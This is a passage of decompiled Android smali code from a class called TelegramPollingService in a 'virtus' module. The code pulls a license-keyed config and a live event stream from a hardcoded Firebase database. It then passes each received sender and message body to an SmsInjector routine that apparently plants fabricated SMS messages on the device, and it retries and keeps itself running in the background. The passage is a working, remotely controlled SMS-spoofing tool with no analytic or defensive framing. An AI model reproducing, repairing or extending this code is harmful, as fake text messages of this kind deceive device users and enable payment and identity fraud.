    invoke-virtual {v7}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    invoke-static {v6, v2}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 377
    invoke-static {p0, v4, v5}, Lcom/virtus/module/SmsInjector;->inject(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Z

    move-result v2

    .line 378
    invoke-direct {p0, p1}, Lcom/virtus/module/TelegramPollingService;->markConsumed(Ljava/lang/String;)V

    if-eqz v2, :cond_3

    .line 380
    const-string v1, "VirtusModule"

    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2, v0}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v2, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v1, v0}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    goto :goto_1

    .line 382
    :cond_3
    const-string v0, "VirtusModule"

    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2, v1}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v2, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v1, " \u2014 consumed marked (sidha flow \u2014 koi pending nahi!)"

    invoke-virtual {v2, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v0, v1}, Landroid/util/Log;->w(Ljava/lang/String;Ljava/lang/String;)I

    goto :goto_1

    .line 372
    :cond_4
    :goto_0
    invoke-direct {p0, p1}, Lcom/virtus/module/TelegramPollingService;->markConsumed(Ljava/lang/String;)V
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0
    .catchall {:try_start_1 .. :try_end_1} :catchall_0

    .line 373
    monitor-exit p0

    return-void

    :catchall_0
    move-exception p1

    goto :goto_2

    :catch_0
    move-exception v0

    .line 385
    :try_start_2
    const-string v1, "VirtusModule"

    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2, v3}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v2, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v1, v0}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    .line 386
    const-string v0, "sender"

    const-string v1, ""

    invoke-virtual {p2, v0, v1}, Lorg/json/JSONObject;->optString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v0

    const-string v1, "body"

    const-string v2, ""

    invoke-virtual {p2, v1, v2}, Lorg/json/JSONObject;->optString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object p2

    invoke-direct {p0, p1, v0, p2}, Lcom/virtus/module/TelegramPollingService;->retryLater(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V
    :try_end_2
    .catchall {:try_start_2 .. :try_end_2} :catchall_0

    .line 388
    :goto_1
    monitor-exit p0

    return-void

    :goto_2
    :try_start_3
    monitor-exit p0
    :try_end_3
    .catchall {:try_start_3 .. :try_end_3} :catchall_0

    throw p1
.end method

.method private readConfig(Landroid/content/SharedPreferences;)V
    .locals 8

    .line 463
    const-string v0, "VirtusModule"

    .line 463
    const-string v2, "license_key"

    const-string v3, ""

    invoke-interface {p1, v2, v3}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object p1

    .line 464
    invoke-virtual {p1}, Ljava/lang/String;->isEmpty()Z

    move-result v2

    if-eqz v2, :cond_0

    goto/16 :goto_5

    :cond_0
    const/4 v2, 0x0

    .line 467
    :try_start_0
    new-instance v4, Ljava/net/URL;

    new-instance v5, Ljava/lang/StringBuilder;

    invoke-direct {v5}, Ljava/lang/StringBuilder;-><init>()V

    const-string v1, "https://virtus-module-default-rtdb.firebaseio.com/config/"

    invoke-virtual {v5, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p1}, Ljava/lang/String;->trim()Ljava/lang/String;

    move-result-object p1

    invoke-virtual {v5, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string p1, ".json"

    invoke-virtual {v5, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    invoke-direct {v4, p1}, Ljava/net/URL;-><init>(Ljava/lang/String;)V

    .line 468
    invoke-virtual {v4}, Ljava/net/URL;->openConnection()Ljava/net/URLConnection;

    move-result-object p1

    check-cast p1, Ljava/net/HttpURLConnection;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_2
    .catchall {:try_start_0 .. :try_end_0} :catchall_1

    .line 469
    :try_start_1
    const-string v1, "GET"

    invoke-virtual {p1, v1}, Ljava/net/HttpURLConnection;->setRequestMethod(Ljava/lang/String;)V

    const/16 v1, 0xbb8

    .line 470
    invoke-virtual {p1, v1}, Ljava/net/HttpURLConnection;->setConnectTimeout(I)V

    const/16 v1, 0x7d0

    .line 471
    invoke-virtual {p1, v1}, Ljava/net/HttpURLConnection;->setReadTimeout(I)V

    .line 472
    invoke-virtual {p1}, Ljava/net/HttpURLConnection;->getResponseCode()I

    move-result v1
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_1
    .catchall {:try_start_1 .. :try_end_1} :catchall_0

    const/16 v2, 0xc8

    if-eq v1, v2, :cond_1

    if-eqz p1, :cond_9

    .line 509
    invoke-virtual {p1}, Ljava/net/HttpURLConnection;->disconnect()V

    return-void

    .line 474
    :cond_1
    :try_start_2
    invoke-virtual {p1}, Ljava/net/HttpURLConnection;->getInputStream()Ljava/io/InputStream;

    move-result-object v1

    .line 475
    new-instance v2, Ljava/io/BufferedReader;

    new-instance v4, Ljava/io/InputStreamReader;

    const-string v5, "UTF-8"

    invoke-direct {v4, v1, v5}, Ljava/io/InputStreamReader;-><init>(Ljava/io/InputStream;Ljava/lang/String;)V

    invoke-direct {v2, v4}, Ljava/io/BufferedReader;-><init>(Ljava/io/Reader;)V

    .line 476
    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    .line 478
    :goto_0
    invoke-virtual {v2}, Ljava/io/BufferedReader;->readLine()Ljava/lang/String;

    move-result-object v4

    if-eqz v4, :cond_2

    invoke-virtual {v1, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    goto :goto_0

    .line 479
    :cond_2
    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    const/4 v2, 0x0

    if-eqz v1, :cond_8

    .line 480
    invoke-virtual {v1}, Ljava/lang/String;->isEmpty()Z

    move-result v4

    if-nez v4, :cond_8

    const-string v4, "null"

    invoke-virtual {v1, v4}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result v4

    if-eqz v4, :cond_3

    goto/16 :goto_3

    .line 484
    :cond_3
    new-instance v4, Lorg/json/JSONObject;

    invoke-direct {v4, v1}, Lorg/json/JSONObject;-><init>(Ljava/lang/String;)V

    .line 485
    const-string v1, "monitoring"

    invoke-virtual {v4, v1, v2}, Lorg/json/JSONObject;->optBoolean(Ljava/lang/String;Z)Z

    move-result v1

    iput-boolean v1, p0, Lcom/virtus/module/TelegramPollingService;->monitoring:Z

    .line 487
    iget-boolean v1, p0, Lcom/virtus/module/TelegramPollingService;->monitoring:Z

    sput-boolean v1, Lcom/virtus/module/TelegramPollingService;->cfgMonitoring:Z

    .line 488
    const-string v1, "ts"

    const-wide/16 v5, 0x0

    invoke-virtual {v4, v1, v5, v6}, Lorg/json/JSONObject;->optLong(Ljava/lang/String;J)J

    move-result-wide v5

    sput-wide v5, Lcom/virtus/module/TelegramPollingService;->cfgTs:J

    .line 489
    const-string v1, "firebase_url"

    invoke-virtual {v4, v1, v3}, Lorg/json/JSONObject;->optString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v1

    .line 490
    const-string v5, "device_id"

    invoke-virtual {v4, v5, v3}, Lorg/json/JSONObject;->optString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v5

    .line 491
    const-string v6, "firebase_key"

    invoke-virtual {v4, v6, v3}, Lorg/json/JSONObject;->optString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    .line 492
    iget-object v6, p0, Lcom/virtus/module/TelegramPollingService;->cfgDb:Ljava/lang/String;

    invoke-virtual {v1, v6}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v6

    const/4 v7, 0x1

    if-eqz v6, :cond_5

    iget-object v6, p0, Lcom/virtus/module/TelegramPollingService;->cfgDevice:Ljava/lang/String;

    invoke-virtual {v5, v6}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v6

    if-eqz v6, :cond_5

    iget-object v6, p0, Lcom/virtus/module/TelegramPollingService;->cfgKey:Ljava/lang/String;

    invoke-virtual {v4, v6}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v6

    if-nez v6, :cond_4

    goto :goto_1

    :cond_4
    const/4 v6, 0x0

    goto :goto_2

    :cond_5
    :goto_1
    const/4 v6, 0x1

    .line 493
    :goto_2
    iput-object v1, p0, Lcom/virtus/module/TelegramPollingService;->cfgDb:Ljava/lang/String;

    .line 494
    iput-object v5, p0, Lcom/virtus/module/TelegramPollingService;->cfgDevice:Ljava/lang/String;

    .line 495
    iput-object v4, p0, Lcom/virtus/module/TelegramPollingService;->cfgKey:Ljava/lang/String;

    if-eqz v6, :cond_7

    .line 496
    iget-boolean v1, p0, Lcom/virtus/module/TelegramPollingService;->monitoring:Z

    if-eqz v1, :cond_7

    .line 497
    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    const-string v4, "CONFIG CHANGED \u2014 chosen: "

    invoke-virtual {v1, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget-object v4, p0, Lcom/virtus/module/TelegramPollingService;->cfgDb:Ljava/lang/String;

    invoke-virtual {v1, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v4, " / "

    invoke-virtual {v1, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget-object v4, p0, Lcom/virtus/module/TelegramPollingService;->cfgDevice:Ljava/lang/String;

    invoke-virtual {v1, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v0, v1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 499
    iput-object v3, p0, Lcom/virtus/module/TelegramPollingService;->lastSeenId:Ljava/lang/String;

    .line 501
    iput-boolean v7, p0, Lcom/virtus/module/TelegramPollingService;->streamStop:Z

    .line 502
    iget-object v1, p0, Lcom/virtus/module/TelegramPollingService;->streamThread:Ljava/lang/Thread;
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_1
    .catchall {:try_start_2 .. :try_end_2} :catchall_0

    if-eqz v1, :cond_6

    :try_start_3
    invoke-virtual {v1}, Ljava/lang/Thread;->interrupt()V
    :try_end_3
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_0
    .catchall {:try_start_3 .. :try_end_3} :catchall_0

    .line 503
    :catch_0
    :cond_6
    :try_start_4
    iput-boolean v2, p0, Lcom/virtus/module/TelegramPollingService;->streamStop:Z

    .line 504
    invoke-direct {p0}, Lcom/virtus/module/TelegramPollingService;->startStreamThread()V
    :try_end_4
    .catch Ljava/lang/Exception; {:try_start_4 .. :try_end_4} :catch_1
    .catchall {:try_start_4 .. :try_end_4} :catchall_0

    :cond_7
    if-eqz p1, :cond_9

    .line 509
    invoke-virtual {p1}, Ljava/net/HttpURLConnection;->disconnect()V

    goto :goto_5

    .line 481
    :cond_8
    :goto_3
    :try_start_5
    iput-boolean v2, p0, Lcom/virtus/module/TelegramPollingService;->monitoring:Z
    :try_end_5
    .catch Ljava/lang/Exception; {:try_start_5 .. :try_end_5} :catch_1
    .catchall {:try_start_5 .. :try_end_5} :catchall_0

    if-eqz p1, :cond_9

    .line 509
    invoke-virtual {p1}, Ljava/net/HttpURLConnection;->disconnect()V

    return-void

    :catchall_0
    move-exception v0

    move-object v2, p1

    goto :goto_6

    :catch_1
    move-exception v1

    move-object v2, p1

    goto :goto_4

    :catchall_1
    move-exception v0

    goto :goto_6

    :catch_2
    move-exception v1

    .line 507
    :goto_4
    :try_start_6
    new-instance p1, Ljava/lang/StringBuilder;

    invoke-direct {p1}, Ljava/lang/StringBuilder;-><init>()V

    const-string v3, "config err: "

    invoke-virtual {p1, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v1}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {p1, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {p1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1

    invoke-static {v0, p1}, Landroid/util/Log;->w(Ljava/lang/String;Ljava/lang/String;)I
    :try_end_6
    .catchall {:try_start_6 .. :try_end_6} :catchall_1

    if-eqz v2, :cond_9

    .line 509
    invoke-virtual {v2}, Ljava/net/HttpURLConnection;->disconnect()V

    :cond_9
    :goto_5
    return-void

    :goto_6
    if-eqz v2, :cond_a

    invoke-virtual {v2}, Ljava/net/HttpURLConnection;->disconnect()V

    .line 510
    :cond_a
    goto :goto_8

    :goto_7
    throw v0

    :goto_8
    goto :goto_7
.end method

.method private retryLater(Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V
    .locals 2

    .line 392
    new-instance v0, Ljava/lang/Thread;

    new-instance v1, Lcom/virtus/module/TelegramPollingService$4;

    invoke-direct {v1, p0, p2, p3, p1}, Lcom/virtus/module/TelegramPollingService$4;-><init>(Lcom/virtus/module/TelegramPollingService;Ljava/lang/String;Ljava/lang/String;Ljava/lang/String;)V

    const-string p1, "virtus-fb-retry"

    invoke-direct {v0, v1, p1}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;Ljava/lang/String;)V

    .line 405
    invoke-virtual {v0}, Ljava/lang/Thread;->start()V

    return-void
.end method

.method private runStream()V
    .locals 8

    const-string v0, "stream HTTP "

    const-string v1, "FB stream connected: "

    .line 253
    const-string v2, "virtus_module_prefs"

    const/4 v3, 0x0

    invoke-virtual {p0, v2, v3}, Lcom/virtus/module/TelegramPollingService;->getSharedPreferences(Ljava/lang/String;I)Landroid/content/SharedPreferences;

    move-result-object v2

    .line 254
    const-string v4, "license_key"

    const-string v5, ""

    invoke-interface {v2, v4, v5}, Landroid/content/SharedPreferences;->getString(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    .line 255
    invoke-virtual {v4}, Ljava/lang/String;->isEmpty()Z

    move-result v6

    const-string v7, "VirtusModule"

    if-eqz v6, :cond_0

    .line 256
    const-string v0, "no license key \u2014 waiting"

    invoke-static {v7, v0}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    return-void

    .line 260
    :cond_0
    invoke-direct {p0, v2}, Lcom/virtus/module/TelegramPollingService;->chosenSourcePath(Landroid/content/SharedPreferences;)Ljava/lang/String;

    move-result-object v2

    if-eqz v2, :cond_c

    .line 261
    invoke-virtual {v2}, Ljava/lang/String;->isEmpty()Z

    move-result v6

    if-eqz v6, :cond_1

    goto/16 :goto_6

    .line 273
    :cond_1
    new-instance v6, Ljava/lang/StringBuilder;

    invoke-direct {v6}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v6, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v2, ".json"

    invoke-virtual {v6, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget-object v2, p0, Lcom/virtus/module/TelegramPollingService;->cfgKey:Ljava/lang/String;

    invoke-virtual {v2}, Ljava/lang/String;->isEmpty()Z

    move-result v2

    if-eqz v2, :cond_2

    goto :goto_0

    :cond_2
    new-instance v2, Ljava/lang/StringBuilder;

    const-string v5, "?auth="

    invoke-direct {v2, v5}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    iget-object v5, p0, Lcom/virtus/module/TelegramPollingService;->cfgKey:Ljava/lang/String;

    invoke-virtual {v2, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v5

    :goto_0
    invoke-virtual {v6, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v6}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v2

    const/4 v5, 0x0

    .line 276
    :try_start_0
    new-instance v6, Ljava/net/URL;

    invoke-direct {v6, v2}, Ljava/net/URL;-><init>(Ljava/lang/String;)V

    .line 277
    invoke-virtual {v6}, Ljava/net/URL;->openConnection()Ljava/net/URLConnection;

    move-result-object v2

    check-cast v2, Ljava/net/HttpURLConnection;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_2
    .catchall {:try_start_0 .. :try_end_0} :catchall_1

    .line 278
    :try_start_1
    const-string v5, "GET"

    invoke-virtual {v2, v5}, Ljava/net/HttpURLConnection;->setRequestMethod(Ljava/lang/String;)V

    const/16 v5, 0x2710

    .line 279
    invoke-virtual {v2, v5}, Ljava/net/HttpURLConnection;->setConnectTimeout(I)V

    .line 280
    invoke-virtual {v2, v3}, Ljava/net/HttpURLConnection;->setReadTimeout(I)V

    .line 281
    const-string v5, "Accept"

    const-string v6, "text/event-stream"

    invoke-virtual {v2, v5, v6}, Ljava/net/HttpURLConnection;->setRequestProperty(Ljava/lang/String;Ljava/lang/String;)V

    .line 282
    const-string v5, "Cache-Control"

    const-string v6, "no-cache"

    invoke-virtual {v2, v5, v6}, Ljava/net/HttpURLConnection;->setRequestProperty(Ljava/lang/String;Ljava/lang/String;)V

    .line 283
    invoke-virtual {v2}, Ljava/net/HttpURLConnection;->getResponseCode()I

    move-result v5

    const/16 v6, 0xc8

    if-eq v5, v6, :cond_5

    .line 285
    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1, v0}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v1, v5}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v7, v0}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    .line 286
    invoke-virtual {v2}, Ljava/net/HttpURLConnection;->getErrorStream()Ljava/io/InputStream;

    move-result-object v0

    if-eqz v0, :cond_4

    .line 288
    new-instance v1, Ljava/io/BufferedReader;

    new-instance v3, Ljava/io/InputStreamReader;

    invoke-direct {v3, v0}, Ljava/io/InputStreamReader;-><init>(Ljava/io/InputStream;)V

    invoke-direct {v1, v3}, Ljava/io/BufferedReader;-><init>(Ljava/io/Reader;)V

    .line 290
    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0}, Ljava/lang/StringBuilder;-><init>()V

    .line 291
    :goto_1
    invoke-virtual {v1}, Ljava/io/BufferedReader;->readLine()Ljava/lang/String;

    move-result-object v3

    if-eqz v3, :cond_3

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->length()I

    move-result v4

    if-ge v4, v6, :cond_3

    invoke-virtual {v0, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    goto :goto_1

    .line 292
    :cond_3
    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    const-string v3, "stream err body: "

    invoke-virtual {v1, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v1, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/Object;)Ljava/lang/StringBuilder;

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v7, v0}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_1
    .catchall {:try_start_1 .. :try_end_1} :catchall_0

    :cond_4
    if-eqz v2, :cond_d

    .line 324
    invoke-virtual {v2}, Ljava/net/HttpURLConnection;->disconnect()V

    return-void

    .line 296
    :cond_5
    :try_start_2
    new-instance v0, Ljava/lang/StringBuilder;

    invoke-direct {v0, v1}, Ljava/lang/StringBuilder;-><init>(Ljava/lang/String;)V

    invoke-virtual {v0, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v7, v0}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 297
    new-instance v0, Ljava/io/BufferedReader;

    new-instance v1, Ljava/io/InputStreamReader;

    invoke-virtual {v2}, Ljava/net/HttpURLConnection;->getInputStream()Ljava/io/InputStream;

    move-result-object v4

    const-string v5, "UTF-8"

    invoke-direct {v1, v4, v5}, Ljava/io/InputStreamReader;-><init>(Ljava/io/InputStream;Ljava/lang/String;)V

    invoke-direct {v0, v1}, Ljava/io/BufferedReader;-><init>(Ljava/io/Reader;)V

    .line 299
    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    .line 300
    :cond_6
    :goto_2
    iget-boolean v4, p0, Lcom/virtus/module/TelegramPollingService;->isRunning:Z

    if-eqz v4, :cond_a

    iget-boolean v4, p0, Lcom/virtus/module/TelegramPollingService;->streamStop:Z

    if-nez v4, :cond_a

    invoke-virtual {v0}, Ljava/io/BufferedReader;->readLine()Ljava/lang/String;

    move-result-object v4

    if-eqz v4, :cond_a

    .line 301
    const-string v5, "data:"

    invoke-virtual {v4, v5}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result v5
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_1
    .catchall {:try_start_2 .. :try_end_2} :catchall_0

    const-string v6, "{"

    if-eqz v5, :cond_8

    const/4 v5, 0x5

    .line 302
    :try_start_3
    invoke-virtual {v4, v5}, Ljava/lang/String;->substring(I)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v4}, Ljava/lang/String;->trim()Ljava/lang/String;

    move-result-object v4

    .line 303
    const-string v5, "null"

    invoke-virtual {v4, v5}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v5

    if-eqz v5, :cond_7

    goto :goto_2

    .line 304
    :cond_7
    invoke-virtual {v4, v6}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result v5

    if-eqz v5, :cond_6

    .line 305
    invoke-direct {p0, v4}, Lcom/virtus/module/TelegramPollingService;->handleEvent(Ljava/lang/String;)V

    goto :goto_2

    .line 307
    :cond_8
    invoke-virtual {v4}, Ljava/lang/String;->trim()Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v5}, Ljava/lang/String;->isEmpty()Z

    move-result v5

    if-eqz v5, :cond_9

    .line 308
    invoke-virtual {v1}, Ljava/lang/StringBuilder;->length()I

    move-result v4
    :try_end_3
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_1
    .catchall {:try_start_3 .. :try_end_3} :catchall_0

    if-lez v4, :cond_6

    .line 310
    :try_start_4
    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v4}, Ljava/lang/String;->trim()Ljava/lang/String;

    move-result-object v4

    invoke-direct {p0, v4}, Lcom/virtus/module/TelegramPollingService;->handleEvent(Ljava/lang/String;)V
    :try_end_4
    .catch Ljava/lang/Exception; {:try_start_4 .. :try_end_4} :catch_0
    .catchall {:try_start_4 .. :try_end_4} :catchall_0

    goto :goto_3

    :catch_0
    move-exception v4

    .line 312
    :try_start_5
    new-instance v5, Ljava/lang/StringBuilder;

    invoke-direct {v5}, Ljava/lang/StringBuilder;-><init>()V

    const-string v6, "parse err: "

    invoke-virtual {v5, v6}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v4}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v5, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v5}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v4

    invoke-static {v7, v4}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    .line 314
    :goto_3
    invoke-virtual {v1, v3}, Ljava/lang/StringBuilder;->setLength(I)V

    goto :goto_2

    .line 316
    :cond_9
    invoke-virtual {v4, v6}, Ljava/lang/String;->startsWith(Ljava/lang/String;)Z

    move-result v5

    if-eqz v5, :cond_6

    .line 317
    invoke-virtual {v1, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    goto :goto_2

    .line 320
    :cond_a
    const-string v0, "stream ended (reconnect)"

    invoke-static {v7, v0}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I
    :try_end_5
    .catch Ljava/lang/Exception; {:try_start_5 .. :try_end_5} :catch_1
    .catchall {:try_start_5 .. :try_end_5} :catchall_0

    if-eqz v2, :cond_d

    .line 324
    invoke-virtual {v2}, Ljava/net/HttpURLConnection;->disconnect()V

    goto :goto_7

    :catchall_0
    move-exception v0

    move-object v5, v2

    goto :goto_5

    :catch_1
    move-exception v0

    move-object v5, v2

    goto :goto_4

    :catchall_1
    move-exception v0

    goto :goto_5

    :catch_2
    move-exception v0

    .line 322
    :goto_4
    :try_start_6
    new-instance v1, Ljava/lang/StringBuilder;

    invoke-direct {v1}, Ljava/lang/StringBuilder;-><init>()V

    const-string v2, "stream error: "

    invoke-virtual {v1, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v0}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v1, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v1}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v7, v0}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I
    :try_end_6
    .catchall {:try_start_6 .. :try_end_6} :catchall_1

    if-eqz v5, :cond_d

    .line 324
    invoke-virtual {v5}, Ljava/net/HttpURLConnection;->disconnect()V

    goto :goto_7

    :goto_5
    if-eqz v5, :cond_b

    invoke-virtual {v5}, Ljava/net/HttpURLConnection;->disconnect()V

    .line 325
    :cond_b
    throw v0

    .line 262
    :cond_c
    :goto_6
    const-string v0, "monitoring OFF / no device \u2014 stream waiting"

    invoke-static {v7, v0}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    const-wide/16 v0, 0x3e8

    .line 263
    :try_start_7
    invoke-static {v0, v1}, Ljava/lang/Thread;->sleep(J)V
    :try_end_7
    .catch Ljava/lang/InterruptedException; {:try_start_7 .. :try_end_7} :catch_3

    .line 264
    iget-boolean v0, p0, Lcom/virtus/module/TelegramPollingService;->streamStop:Z

    if-nez v0, :cond_d

    .line 265
    new-instance v0, Ljava/lang/Thread;

    new-instance v1, Lcom/virtus/module/TelegramPollingService$3;

    invoke-direct {v1, p0}, Lcom/virtus/module/TelegramPollingService$3;-><init>(Lcom/virtus/module/TelegramPollingService;)V

    const-string v2, "virtus-sse"

    invoke-direct {v0, v1, v2}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;Ljava/lang/String;)V

    iput-object v0, p0, Lcom/virtus/module/TelegramPollingService;->streamThread:Ljava/lang/Thread;

    const/4 v1, 0x1

    .line 268
    invoke-virtual {v0, v1}, Ljava/lang/Thread;->setDaemon(Z)V

    .line 269
    iget-object v0, p0, Lcom/virtus/module/TelegramPollingService;->streamThread:Ljava/lang/Thread;

    invoke-virtual {v0}, Ljava/lang/Thread;->start()V

    :catch_3
    :cond_d
    :goto_7
    return-void
.end method

.method private scheduleKeepAlive()V
    .locals 8

    .line 152
    :try_start_0
    const-string v0, "alarm"

